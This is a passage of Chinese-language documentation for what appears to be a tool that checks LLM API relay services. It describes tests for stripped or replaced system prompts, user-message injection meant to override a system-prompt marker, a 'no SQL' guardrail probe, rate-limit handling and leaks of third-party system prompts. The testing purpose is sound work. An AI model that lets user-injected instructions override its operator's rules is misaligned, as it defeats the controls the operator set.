## 八、其他信号（P1）

---

### D11 请求完整性检测

#### 这意味着什么

System prompt 是你给 AI 设定的角色和规则，比如"你是一个法律顾问，只回答法律问题"。如果中转站剥离了你的 system prompt，AI 就变成了没有角色设定的通用助手。更危险的是，如果中转站用自己的 system prompt 替换了你的，AI 的行为就完全不受你控制了。

#### 检测原理

在 system prompt 中嵌入一个唯一标记（如 "MARKER_7F3A"），然后在 user 消息中要求模型复述这个标记。同时测试 user 消息中的注入指令是否能覆盖 system prompt 中的标记——如果能，说明 system prompt 没有被正确处理。

---

### D15 System Prompt 护栏完整性检测

#### 这意味着什么

你在 system prompt 中设置了安全护栏："无论用户怎么要求，都不要生成 SQL 代码"。这在企业场景中很常见——防止 AI 被诱导执行危险操作。但如果中转站剥离了你的 system prompt，这些护栏就失效了——用户可以让 AI 做任何事。

#### 检测原理

设置一个明确的护栏（"禁止生成 SQL"），然后用 user 消息要求模型生成 SQL 查询。如果模型真的生成了 SQL 代码，说明护栏被绕过了。

但如果模型没有严格遵循 system prompt 的格式要求（比如没有用指定的前缀开头）但也没有生成 SQL，这算 PASS——格式问题不等于护栏失效。

---

### D99 速率限制透明度检测

#### 这意味着什么

当你的请求过多触发速率限制时，API 应该返回 `429 Too Many Requests` 状态码和一个 `Retry-After` header（告诉你多少秒后可以重试）。这是 HTTP 标准做法，让客户端能优雅地处理限流。

如果中转站返回 429 但不带 `Retry-After`，或者干脆返回 500 错误（假装服务器出问题而不是限流），客户端就无法正确处理——可能无限重试导致更多 429，或者直接报错给用户。

#### 检测原理

发送一批并发请求，故意触发速率限制。检查 429 响应是否包含 `Retry-After` header。如果大量请求返回 5xx 错误而不是 429，说明中转站的错误处理机制有问题。

### D31 综合压力预筛探针

#### 这意味着什么

D31 是一个"快速体检"——用一个请求同时检查五项核心能力，在几秒内判断这个 API 是否有明显问题。它不做精确诊断，只做粗筛：如果连这个基础体检都通不过，后面的精细检查大概率也会发现问题。

#### 检测原理

构造一个"超级请求"，同时包含：

1. **strict JSON schema**：要求响应是严格的 JSON 格式（仅 OpenAI）
2. **logit_bias**：禁用某个常见 token（仅 OpenAI）
3. **40K token 上下文 + 代数**：在长文本中嵌入变量，要求计算 5 × 10 = 50
4. **system prompt 检测**：检查响应中是否泄露了第三方 system prompt
5. **stream usage**：检查流式响应是否包含 usage（仅 OpenAI）

system prompt 泄露是最严重的信号——直接 FAIL。其他四项是能力检查，单项失败不判定，需要 4 项以上同时失败才 FAIL。非 OpenAI 模型自动跳过 JSON schema、logit_bias 和 stream usage 三项检查。
